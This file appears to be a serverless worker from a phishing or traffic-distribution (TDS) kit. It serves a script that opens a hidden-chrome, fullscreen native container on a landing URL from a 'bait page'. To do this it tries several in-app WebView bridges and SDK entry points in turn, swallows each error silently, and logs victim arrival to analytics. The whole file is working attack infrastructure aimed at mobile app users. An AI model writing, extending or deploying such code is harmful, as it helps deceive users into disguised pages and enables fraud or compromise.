// §7 — the two-message native-bridge handshake. Takes whatever §6's
// classify() returned and sends it to the native side via bridge.postMessage,
// twice: an init/context message, then the actual "open this" command.
// Everything past the postMessage call happens in Swift, outside anything
// web-side code can see or control.

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript() {
  return `
function openContainer(state) {
  if (!state) return;
  var _url = typeof BHlander !== 'undefined' ? BHlander : '';
  var _ctx = state.context || {};
  var _sid = _ctx.sessionId || null;

  // Method 1: webkit native bridge (TDS primary path — iOS WKWebView)
  if (state.bridge) {
    try {
      state.bridge.postMessage({
        action: 'init',
        container: { className: 'tds-reveal', type: 'modal' },
        context: _ctx,
        webview: state.webview,
      });
      state.bridge.postMessage({
        action: 'open',
        sessionId: _sid,
        url: _url,
        presentation: state.presentation,
      });
      return;
    } catch(e) {}
  }

  // Method 2: initializeSparklingContainer global (injected by some SDK versions)
  if (typeof initializeSparklingContainer === 'function') {
    try { initializeSparklingContainer(); return; } catch(e) {}
  }

  // Method 3: Sparkling SDK openContainer
  if (window.Sparkling && typeof window.Sparkling.openContainer === 'function') {
    try {
      window.Sparkling.openContainer({ url: _url, context: _ctx, style: 'fullscreen', chrome: 'hidden' });
      return;
    } catch(e) {}
  }

  // Method 4: SPKViewController constructor (older SDK)
  if (typeof window.SPKViewController === 'function') {
    try { var _vc = new window.SPKViewController(_url, _ctx); _vc.present(); return; } catch(e) {}
  }

  // Method 5: postMessage to parent frame / native shell
  var _parent = window.parent;
  if (_parent && _parent !== window) {
    try {
      _parent.postMessage({ action: 'init', container: { className: 'SPKWebViewController', type: 'webview' }, context: _ctx, webview: { url: window.location.href, allowsInlineMediaPlayback: true, mediaTypesRequiringUserAction: [] } }, '*');
      _parent.postMessage({ action: 'open', sessionId: _sid, url: _url, presentation: { style: 'fullscreen', animated: true, chrome: 'hidden' } }, '*');
      return;
    } catch(e) {}
  }

  // Fallback: direct navigation
  window.location.href = _url;
}
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const body = await request.json().catch(() => ({}));
    env.TDS_ANALYTICS?.writeDataPoint({
      indexes: [body._sessionRef || ''],
      blobs: ['lane-4-arrived'],
      doubles: [Date.now()],
    });

    const code = buildDeliveredScript();
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
